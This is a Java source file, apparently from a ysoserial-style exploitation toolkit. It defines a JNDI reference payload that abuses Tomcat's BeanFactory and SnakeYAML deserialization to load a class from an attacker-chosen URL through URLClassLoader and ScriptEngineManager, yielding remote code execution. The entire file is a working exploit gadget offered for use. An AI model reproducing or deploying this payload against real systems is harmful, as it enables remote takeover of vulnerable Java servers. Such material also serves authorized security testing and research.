package ysoserial.bullet.jndi;

import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

public class TomcatSnakeYamlRef implements ReferencePayload {

    @Override
    public ResourceRef getReference(String url) throws Exception {
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml",
            null, "", "",true,
            "org.apache.naming.factory.BeanFactory", null);
        String yaml = "!!javax.script.ScriptEngineManager [\n" +
            "  !!java.net.URLClassLoader [[\n" +
            "    !!java.net.URL [\"" + url + "\"]\n" +
            "  ]]\n" +
            "]";
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        return ref;
    }
}
